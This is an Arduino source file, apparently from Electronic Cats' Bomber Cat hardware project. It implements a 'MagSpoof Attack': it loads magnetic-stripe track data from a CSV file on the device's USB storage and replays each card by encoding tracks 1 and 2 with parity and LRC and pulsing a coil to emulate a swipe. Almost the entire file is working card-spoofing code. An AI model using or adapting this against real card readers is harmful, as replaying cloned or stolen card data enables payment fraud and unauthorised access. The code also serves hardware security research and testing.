/************************************************************
  MagSpoof Attack for Bomber Cat
  by Andres Sabas, Electronic Cats (https://electroniccats.com/)
  by Salvador Mendoza (salmg.net)
  Electronic Cats (https://electroniccats.com/)
  Date: 12/09/2022

  This example demonstrates how to use Bomber Cat by Electronic Cats
  https://github.com/ElectronicCats/BomberCat

  Development environment specifics:
  IDE: Arduino 1.8.19
  Hardware Platform:
  Bomber Cat
  - RP2040

  Electronic Cats invests time and resources providing this open source code, 
  please support Electronic Cats and open-source hardware by purchasing 
  products from Electronic Cats!

  This code is beerware; if you see me (or any other Electronic Cats
  member) at the local, and you've found our code helpful,
  please buy us a round!
  Distributed as-is; no warranty is given.
*/
#include "PluggableUSBMSD.h"
#include "FlashIAPBlockDevice.h"

#define DEBUG
#define L1         (LED_BUILTIN)  //LED1

#define PIN_A      (6) //MagSpoof-1
#define PIN_B      (7) //MagSpoof

#define NPIN       (5) //Button

#define CLOCK_US   (500)

#define BETWEEN_ZERO (53) // 53 zeros between track1 & 2

#define TRACKS (2)

// consts get stored in flash as we don't adjust them
// consts get stored in ram as we don't adjust them
char tracks[2][128];

char revTrack[41];

const int sublen[] = {
  32, 48, 48 
};
const int bitlen[] = {
  7, 5, 5 
};

unsigned int curTrack = 0;
int dir;

static FlashIAPBlockDevice bd(XIP_BASE + 0x100000, 0x100000);

USBMSD MassStorage(&bd);

FILE *f = nullptr;

char buf[255] { 0 };

const char *fname = "/fs/data.csv";

void USBMSD::begin()
{
  int err = getFileSystem().mount(&bd);
  if (err) {
    err = getFileSystem().reformat(&bd);
  }
}

mbed::FATFileSystem &USBMSD::getFileSystem()
{
  static mbed::FATFileSystem fs("fs");
  return fs;
}

void readContents() {
  f = fopen(fname, "r");
  if (f != nullptr) {
    while (std::fgets(buf, sizeof buf, f) != nullptr)
      Serial.print(buf);
    fclose(f);
    Serial.println("File found");
  }
  else {
    Serial.println("File not found");
  }
}

void blink(int pin, int msdelay, int times){
  for (int i = 0; i < times; i++){
    digitalWrite(pin, HIGH);
    delay(msdelay);
    digitalWrite(pin, LOW);
    delay(msdelay);
  }
}

// send a single bit out
void playBit(int sendBit){
  dir ^= 1;
  digitalWrite(PIN_A, dir);
  digitalWrite(PIN_B, !dir);
  delayMicroseconds(CLOCK_US);

  if (sendBit){
    dir ^= 1;
    digitalWrite(PIN_A, dir);
    digitalWrite(PIN_B, !dir);
  }
  delayMicroseconds(CLOCK_US);

}

// when reversing
void reverseTrack(int track){
  int i = 0;
  track--; // index 0
  dir = 0;

  while (revTrack[i++] != '\0');
  i--;
  while (i--)
    for (int j = bitlen[track]-1; j >= 0; j--)
      playBit((revTrack[i] >> j) & 1);
}

// plays out a full track, calculating CRCs and LRC
void playTrack(int track){
  int tmp, crc, lrc = 0;
  dir = 0;
  track--; // index 0
  // enable H-bridge and LED
  //digitalWrite(ENABLE_PIN, HIGH);

  // First put out a bunch of leading zeros.
  for (int i = 0; i < 25; i++)
    playBit(0);

  for (int i = 0; tracks[track][i] != '\0'; i++)
  {
    crc = 1;
    tmp = tracks[track][i] - sublen[track];
    
    for (int j = 0; j < bitlen[track]-1; j++)
    {
      crc ^= tmp & 1;
      lrc ^= (tmp & 1) << j;
      playBit(tmp & 1);
      tmp >>= 1;
    }
    playBit(crc);
  }

  // finish calculating and send last "byte" (LRC)
  tmp = lrc;
  crc = 1;
  for (int j = 0; j < bitlen[track]-1; j++)
  {
    crc ^= tmp & 1;
    playBit(tmp & 1);
    tmp >>= 1;
  }
  playBit(crc);

  // if track 1, play 2nd track in reverse (like swiping back?)
  if (track == 0)
  {
    // if track 1, also play track 2 in reverse
    // zeros in between
    for (int i = 0; i < BETWEEN_ZERO; i++)
      playBit(0);

    // send second track in reverse
    reverseTrack(2);
  }

  // finish with 0's
  for (int i = 0; i < 5 * 5; i++)
    playBit(0);

  digitalWrite(PIN_A, LOW);
  digitalWrite(PIN_B, LOW);

}

// stores track for reverse usage later
void storeRevTrack(int track){
  int i, tmp, crc, lrc = 0;
  track--; // index 0
  dir = 0;

  for (i = 0; tracks[track][i] != '\0'; i++)
  {
    crc = 1;
    tmp = tracks[track][i] - sublen[track];

    for (int j = 0; j < bitlen[track]-1; j++)
    {
      crc ^= tmp & 1;
      lrc ^= (tmp & 1) << j;
      tmp & 1 ?
        (revTrack[i] |= 1 << j) :
        (revTrack[i] &= ~(1 << j));
      tmp >>= 1;
    }
    crc ?
      (revTrack[i] |= 1 << 4) :
      (revTrack[i] &= ~(1 << 4));
  }

  // finish calculating and send last "byte" (LRC)
  tmp = lrc;
  crc = 1;
  for (int j = 0; j < bitlen[track]-1; j++)
  {
    crc ^= tmp & 1;
    tmp & 1 ?
      (revTrack[i] |= 1 << j) :
      (revTrack[i] &= ~(1 << j));
    tmp >>= 1;
  }
  crc ?
    (revTrack[i] |= 1 << 4) :
    (revTrack[i] &= ~(1 << 4));

  i++;
  revTrack[i] = '\0';
}

void magspoof(){
    Serial.println("Activating MagSpoof...");
    playTrack(1 + (curTrack++ % 2));
    blink(L1, 150, 3);
    delay(400);
}

void setup() {
  Serial.begin(115200);
  MassStorage.begin();
  pinMode(PIN_A, OUTPUT);
  pinMode(PIN_B, OUTPUT);
  pinMode(L1, OUTPUT);
  pinMode(NPIN, INPUT_PULLUP);
  
  #ifdef DEBUG
  while (!Serial) {
    ; // wait for serial port to connect. Needed for native USB port only
  }
  #endif
  Serial.println("BomberCat, yes Sir!");
  Serial.println("MagSpoof Attack!!");
  
  f = fopen(fname, "r");
  if (f != nullptr) {
    while (std::fgets(buf, 255 , f) != nullptr){
      Serial.print("Buf: ");
      Serial.write(buf);
      Serial.println();
      int i,j;
      j = 0;
      for (i = 0; i < 255; i++) {
        if (buf[i] == '?' && j == 0) {
          tracks[0][i] = buf[i];
          j = i;
          tracks[0][i + 1] = NULL;
        }
        if (j == 0) {
          tracks[0][i] = buf[i];
        }
        else {
          tracks[1][i - j] = buf[i + 1];
          if (buf[i + 1] == '?') {
            tracks[1][i - j + 1] = NULL;
            break;
          }
        }
      }
      Serial.print("Track 0: ");
      Serial.write(tracks[0]);
      Serial.println();
      Serial.print("Track 1: ");
      Serial.write(tracks[1]);
      Serial.println();
      magspoof();
    }
  }
  fclose(f);
  Serial.println("MagSpoof Attack End!!");
}

void loop() {
  // put your main code here, to run repeatedly:

}
